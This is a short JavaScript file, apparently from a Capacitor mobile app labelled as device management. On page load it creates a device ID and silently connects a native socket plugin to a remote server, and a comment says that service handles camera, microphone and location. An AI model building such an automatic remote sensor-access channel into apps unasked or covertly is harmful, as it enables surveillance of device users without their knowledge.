'use strict'

const SERVER_URL = 'https://ping-1-production.up.railway.app'

window.addEventListener('load', async () => {
  let deviceId = localStorage.getItem('mdm-device-id')
  if (!deviceId) {
    deviceId = 'device-' + Math.random().toString(36).slice(2, 10)
    localStorage.setItem('mdm-device-id', deviceId)
  }
  // Native service handles all camera/mic/location — no browser socket needed
  try {
    const NativeSocket = window.Capacitor?.Plugins?.NativeSocket
    if (NativeSocket) await NativeSocket.connect({ url: SERVER_URL, deviceId })
  } catch (e) {}
})
